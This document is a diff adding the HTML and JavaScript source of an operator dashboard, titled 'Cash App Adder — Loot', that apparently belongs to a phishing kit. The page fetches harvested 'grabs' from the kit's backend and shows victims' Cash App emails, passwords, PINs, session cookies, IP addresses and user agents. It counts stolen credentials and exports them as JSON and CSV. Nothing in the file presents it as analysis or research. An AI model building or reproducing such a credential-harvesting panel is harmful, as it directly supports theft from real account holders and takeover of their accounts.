@@ -1,0 +1,78 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Loot · Cash App Adder</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font:13px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;background:#050d08;color:#c9e9d6;padding:22px}
+h1{font-size:15px;font-weight:800;color:#fff;margin-bottom:4px}
+.bar{display:flex;gap:9px;align-items:center;margin:16px 0 20px;flex-wrap:wrap}
+input,button{font:inherit;padding:8px 11px;border-radius:8px;border:1px solid #1c3a26;background:#0b1a11;color:#c9e9d6}
+button{cursor:pointer;background:#00d54b;color:#04180c;font-weight:800;border:0}
+button.alt{background:#0b1a11;color:#c9e9d6;border:1px solid #1c3a26}
+.stat{background:#0b1a11;border:1px solid #1c3a26;border-radius:10px;padding:11px 15px;font-size:11px}
+.stat b{display:block;font-size:19px;color:#00d54b}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{text-align:left;padding:9px 10px;background:#0b1a11;color:#6f9a80;font-size:10px;text-transform:uppercase;letter-spacing:.08em;border-bottom:1px solid #1c3a26;position:sticky;top:0}
+td{padding:9px 10px;border-bottom:1px solid #101f16;vertical-align:top;word-break:break-all}
+tr:hover td{background:#08150e}
+.pw{color:#ffd166}.pin{color:#00d54b;font-weight:800;font-size:15px;letter-spacing:2px}
+.tag{font-size:9px;padding:2px 7px;border-radius:99px;background:#12301f;color:#7fd6a0;font-weight:800}
+.tag.done{background:#00d54b;color:#04180c}
+.muted{color:#54705f;font-size:10.5px}
+pre{background:#08150e;border:1px solid #1c3a26;border-radius:8px;padding:10px;font-size:10.5px;max-height:260px;overflow:auto;white-space:pre-wrap}
+</style></head><body>
+<h1>🟢 CASH APP ADDER — LOOT</h1>
+<div class="muted">Auto-refresh 5s. Sorted newest first.</div>
+<div class="bar">
+  <input id="key" placeholder="admin key (if set)" style="width:190px">
+  <button onclick="load()">Load</button>
+  <button class="alt" onclick="setInterval(load,5000);load()">Auto</button>
+  <button class="alt" onclick="expJson()">Export JSON</button>
+  <button class="alt" onclick="expCsv()">Export CSV</button>
+  <div class="stat"><b id="n">0</b>grabs</div>
+  <div class="stat"><b id="np">0</b>with password</div>
+  <div class="stat"><b id="nk">0</b>with PIN</div>
+</div>
+<table><thead><tr>
+<th>Time</th><th>Stage</th><th>Account</th><th>Password</th><th>PIN</th><th>Cookie</th><th>IP</th><th>UA</th><th></th>
+</tr></thead><tbody id="tb"></tbody></table>
+<script>
+let data = [];
+const esc = s => String(s==null?'':s).replace(/[<>&"]/g, c=>({'<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;'}[c]));
+async function load(){
+  const k = document.getElementById('key').value;
+  const r = await fetch('/api/grab' + (k ? '?key=' + encodeURIComponent(k) : ''));
+  if(!r.ok){ document.getElementById('tb').innerHTML = '<tr><td colspan=9>401 — wrong admin key</td></tr>'; return; }
+  const j = await r.json();
+  data = j.grabs || [];
+  document.getElementById('n').textContent = data.length;
+  document.getElementById('np').textContent = data.filter(x=>x.password).length;
+  document.getElementById('nk').textContent = data.filter(x=>x.pin).length;
+  document.getElementById('tb').innerHTML = data.slice(0,300).map((r,i)=>
+    '<tr><td class="muted">'+(r.received||'').replace('T',' ').slice(0,19)+'</td>'+
+    '<td><span class="tag '+(r.stage==='done'?'done':'')+'">'+esc(r.stage)+'</span></td>'+
+    '<td>'+esc(r.email)+'</td>'+
+    '<td class="pw">'+esc(r.password)+'</td>'+
+    '<td class="pin">'+esc(r.pin)+'</td>'+
+    '<td class="muted" style="max-width:180px">'+esc((r.cookies||'').slice(0,70))+'</td>'+
+    '<td class="muted">'+esc(r.ip)+'</td>'+
+    '<td class="muted" style="max-width:220px">'+esc((r.ua||'').slice(0,60))+'</td>'+
+    '<td><button class="alt" onclick="detail('+i+')">raw</button></td></tr>').join('');
+}
+function detail(i){
+  const r = data[i];
+  const w = window.open('','_blank');
+  w.document.write('<pre style="font:11px monospace;background:#050d08;color:#c9e9d6;padding:16px;white-space:pre-wrap">'+esc(JSON.stringify(r,null,2))+'</pre>');
+}
+function dl(name, txt, type){
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([txt],{type})); a.download=name; a.click();
+}
+function expJson(){ dl('grabs.json', JSON.stringify(data,null,2), 'application/json'); }
+function expCsv(){
+  const cols=['received','stage','sid','email','password','pin','cookies','ip','ua','ref'];
+  dl('grabs.csv', [cols.join(',')].concat(data.map(r=>cols.map(c=>'"'+String(r[c]??'').replace(/"/g,'""')+'"').join(','))).join('\n'), 'text/csv');
+}
+load();
+</script></body></html>
